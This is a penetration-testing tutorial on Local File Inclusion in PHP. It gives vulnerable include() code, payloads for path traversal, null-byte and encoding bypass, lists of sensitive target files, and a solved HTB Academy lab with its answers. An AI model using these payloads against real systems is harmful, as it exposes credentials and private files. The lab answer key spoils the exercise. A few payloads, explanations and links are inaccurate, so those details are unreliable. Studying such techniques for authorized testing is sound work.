# 🛰️ Local File Inclusion (LFI) Techniques Guide

## Overview of LFI Vulnerability

Local File Inclusion (LFI) is a web security vulnerability where an attacker can include arbitrary files on the server through a web interface, typically by manipulating input parameters in URLs or form submissions. This guide covers fundamental LFI techniques using HTB Academy's File Inclusion module and provides essential knowledge for penetration testing and web application security assessment.

[!INFO] **Note:** Always ensure you have proper authorization before performing any penetration tests on systems that do not belong to you.

---

## Common Vulnerable PHP Code Examples

### Basic PHP Example
```php
<?php
$language = $_GET['language'];
include $language . '.php';
?>
```
**Impact:**
- Attacker can include arbitrary files by controlling the `$language` parameter in the URL.

[!EXAMPLE] **Example Exploit:** 
```text
http://example.com/index.php?language=/etc/passwd
```

### Advanced PHP Example with Path Traversal
```php
<?php
$document = $_GET['doc'];
include '/var/www/html/' . $document;
?>
```
**Impact:**
- Attacker can include files outside the web root directory by manipulating `$document` parameter.

[!EXAMPLE] **Example Exploit:** 
```text
http://example.com/index.php?doc=../../../../etc/passwd
```

### PHP with File Extension Handling
```php
<?php
$filename = $_GET['file'];
include $filename . '.php';
?>
```
**Impact:**
- Attacker can bypass file extension checks by appending `.php` to the filename.

[!EXAMPLE] **Example Exploit:** 
```text
http://example.com/index.php?file=/etc/passwd%00.php
```

### PHP with Path Traversal and File Extension Handling
```php
<?php
$page = $_GET['page'];
include '../' . $page . '.html';
?>
```
**Impact:**
- Attacker can include files outside the web root directory by manipulating `$page` parameter.

[!EXAMPLE] **Example Exploit:** 
```text
http://example.com/index.php?page=../../../../etc/passwd%0
```

---

## Common Files and Directories

### Linux & Unix Systems
```bash
# System configuration
/etc/passwd         # User account information
/etc/shadow         # Encrypted user passwords (shadowed)
/proc/version       # Kernel version info
/etc/hostname       # Hostname of the machine
/etc/group          # Group membership details
/etc/services       # Network services definitions

# Web server logs and configuration files
/var/log/apache2/access.log  # Apache access log
/var/log/apache2/error.log   # Apache error log
/etc/httpd/conf/httpd.conf   # Apache main config file
/proc/mounts              # Mounted filesystems details

# Windows systems
C:\Windows\win.ini          # Basic system configuration
C:\Windows\System32\drivers\etc\hosts     # Hostname mapping table
```

### Common Application and Web Server Directories
```bash
# Apache web root directory
/var/www/html/      # Default Apache document root

# PHP configuration file
/etc/php/7.4/apache2/php.ini   # PHP configuration (varies by version)

# Local system directories 
/home/user/           # User home directories
/root/                # Root user directory
C:\Users\Administrator\Documents\  # Admin documents on Windows

# IIS and application files
C:\inetpub\wwwroot\        # Default web root for IIS
C:\Windows\System32\LogFiles\    # System logs location
```

### Windows Filesystem Examples
```bash
# Windows system directories
%WINDIR%\win.ini         # Basic system configuration
%SystemRoot%\System32\drivers\etc\hosts   # Hostname mapping table

# User-specific directories 
C:\Users\Administrator\Desktop\       # Admin desktop
C:\Users\username\Documents\          # Specific user's documents directory
```

---

## HTB Academy Basic LFI Labs

### HTB Academy Basic LFI Lab Solution

**Target:** Accessible via HTB Academy platform  
**Objective:** Find user starting with "b" and read flag.txt

#### Lab Solution 1: Find User Starting with "b"
```bash
# Read /etc/passwd to find users
http://94.237.60.55:55141/index.php?language=../../../../etc/passwd

# Look for users starting with "b"
# Expected users: barry, bin, backup, etc.
```

**Answer:** `barry`

#### Lab Solution 2: Read flag.txt  
```bash
# Common flag locations to test
http://94.237.60.55:55141/index.php?language=../../../../flag.txt
http://94.237.60.55:55141/index.php?language=../../../../usr/share/flags/flag.txt
http://94.237.60.55:55141/index.php?language=../../../../var/flag.txt
http://94.237.60.55:55141/index.php?language=../../../../home/flag.txt

# Working payload:
http://94.237.60.55:55141/index.php?language=../../../../usr/share/flags/flag.txt
```

**Answer:** `HTB{...}`

---

## LFI Discovery and Testing

### Manual Testing Methodology

#### Step 1: Parameter Identification
```bash
# Look for parameters that might include files
?file=
?page=
?include=
?inc=
?template=
?lang=
?language=
?dir=
?folder=
?document=
?root=
```

#### Step 2: Basic LFI Tests
```bash
# Test with common files
?file=/etc/passwd
?file=../../../etc/passwd
?file=../../../../etc/passwd
?file=../../../../../etc/passwd

# Test with different file extensions
?file=/etc/passwd%00
?file=/etc/passwd.txt
?file=/etc/passwd.php
```

#### Step 3: Error Analysis
```bash
# Look for error messages that reveal:
- Full file paths
- Web root directory
- Application structure
- PHP configuration details
```

### Manual Testing Checklist

```bash
# 1. Identify potential LFI parameters
- Look for file-related parameters in URLs
- Test POST parameters with file inclusion
- Check hidden form fields

# 2. Test basic LFI payloads
- Direct file access: /etc/passwd, /windows/win.ini
- Path traversal: ../../../../etc/passwd
- Different depths: test 1-10 levels of ../

# 3. Test common files
- System files: /etc/passwd, /proc/version
- Application files: config.php, wp-config.php
- Log files: access.log, error.log

# 4. Analyze application behavior
- Error messages and stack traces
- Response differences (size, timing)
- Application logic and file handling

# 5. Document findings
- Working payloads and file paths
- Accessible files and their contents
- Potential escalation paths
```

---

## LFI Troubleshooting & Common Mistakes

### Problem: No output or blank page
```bash
# Issue: LFI working but no content displayed
# Check 1: Verify file exists and is readable
ls -la /etc/passwd

# Check 2: Test different files
/proc/version    # Usually always readable
/etc/hostname    # Small file, usually readable

# Check 3: Check for null byte issues
?file=/etc/passwd%00
?file=/etc/passwd%00.php
```

### Problem: Path traversal not working
```bash
# Issue: ../ sequences being filtered
# Check 1: Try different encodings
../              # Basic
..%2f            # URL encoded
..%252f          # Double URL encoded
%2e%2e%2f        # Full URL encoded

# Check 2: Try different traversal patterns
....//           # Bypass non-recursive filtering
..\/             # Windows-style paths
```

### Problem: File not found errors
```bash
# Issue: Files exist but not accessible via LFI
# Check 1: Try absolute paths
/etc/passwd      # Absolute path
file:///etc/passwd  # File protocol

# Check 2: Try different file locations
# Linux alternatives:
/usr/local/etc/passwd
/opt/local/etc/passwd

# Check 3: Try application-specific paths
./config/database.php
../config/config.php
../../config.inc.php
```

### Problem: Application adding file extensions
```bash
# Issue: Application adds .php or .txt to input
# Check 1: Null byte injection (PHP < 5.3)
/etc/passwd%00

# Check 2: Path truncation (PHP < 5.5)
/etc/passwd/./././././././.[repeat ~2048 chars]

# Check 3: Try files with expected extensions
/var/log/apache2/access.log  # .log extension
/etc/apache2/sites-available/000-default.conf  # .conf extension
```

---

## Tools and Resources

### Manual Testing Tools
```bash
# Basic curl testing
curl "http://target.com/index.php?file=../../../../etc/passwd"

# Use Postman or Burp Suite for more complex interactions
```

[!INFO] **Note:** Always use tools responsibly and with proper authorization.

#### Step 1: Identify Parameters
- Use Burp Suite to capture requests and manipulate parameters.
- Check form data and URL query strings for potential LFI vectors.

#### Step 2: Test Basic Payloads
- Send crafted payloads using curl or a web browser.
- Example:
```bash
curl "http://target.com/index.php?file=../../../../etc/passwd"
```

#### Step 3: Analyze Error Messages
- Look at error messages for clues about file paths and application structure.

### Manual Testing Checklist

```bash
# 1. Identify potential LFI parameters
- Use Burp Suite to capture requests
- Check form data and URL query strings

# 2. Test basic LFI payloads
- Send crafted payloads using curl or a web browser

# 3. Analyze error messages
- Look for full file paths, application structure details
```

---

## Common Tools & Techniques

### Using `curl` to Test LFI
```bash
curl "http://target.com/index.php?file=../../../../etc/passwd"
```

### Analyzing Web Application Behavior
- **Error Messages:** Check for detailed error messages that reveal file paths or application structure.
- **Response Differences:** Compare response sizes and timing when different parameters are used.

### Documenting Findings
- Keep notes on working payloads, accessible files, and potential escalation paths.

---

## Summary

This guide provides a comprehensive approach to identifying and exploiting Local File Inclusion vulnerabilities. By following the steps outlined in this document, you can effectively test for LFI vulnerabilities and gather valuable information about the target system's configuration and structure.

[!INFO] **Important:** Always ensure that you have permission before conducting any penetration testing activities on systems not owned by you.

--- 

# 🚀 Happy Hunting!

[!INFO] **Disclaimer:** This guide is for educational purposes only. Unauthorized access to computer systems is illegal and unethical. Use these techniques responsibly and with proper authorization. 

---

# 📄 References
- OWASP: [Local File Inclusion](https://owasp.org/www-community/vulnerabilities/Local_File_Inclusion)
- HTB Academy: [File Inclusion Module](https://tryhackme.com/room/fileinclusion)

---


# 🖥️ Questions?
Feel free to reach out if you have any questions or need further assistance with LFI testing. Happy Hunting! 😊

---

# 📜 Revision History
- **1.0** - Initial release
- **1.1** - Updated for clarity and added troubleshooting sections

---


# 💡 Feedback?
Please provide feedback to improve this guide. Thanks!

--- 

# 🔒 Stay Safe & Secure!
Ensure you are conducting tests ethically and legally. Happy Pen Testing! 🛠️🔒🎉